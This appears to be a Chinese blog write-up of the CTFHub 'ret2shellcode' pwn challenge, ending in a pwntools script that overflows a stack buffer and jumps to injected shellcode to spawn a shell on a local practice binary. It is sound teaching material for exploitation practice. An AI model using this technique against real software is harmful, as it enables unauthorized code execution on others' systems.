---
title: CTFHUB Pwn ret2shellcode Writeup
date: 2020-11-01 14:13:19
tags:
- CTF刷题
- PWN
- ROP
- 栈溢出
categories: 竞赛
mathjax: true
---

[题目链接](https://www.ctfhub.com/#/skilltree)

<!-- more -->

checksec 看一下：

![20201101130628](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101130628.png)

没有保护。

IDA 反汇编看一下：

![20201101140409](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101140409.png)

可以栈溢出。

![20201101130748](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101130748.png)

没有 system 函数。

gdb vmmap 看一下栈是可执行的：

![20201101131013](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101131013.png)

可以把 shellcode 放在返回地址之后，然后把返回地址指向 shellcode。


exp 如下：

```python
from pwn import *
import re

# context.log_level = "debug"
context.arch = 'amd64'

p = process("./pwn")

buf_addr = p.recvuntil("]")
buf_addr = int(buf_addr[-15: -1], 16)  # buf 的地址
shellcode_addr = buf_addr + 32  # shellcode 的地址 = buf与rbp的距离16 + rbp的宽度8 + 返回地址的长度8


shellcode = asm(shellcraft.sh())

payload = b'a' * 24 + p64(shellcode_addr) + shellcode
p.recv()
p.sendline(payload)
p.interactive()
```
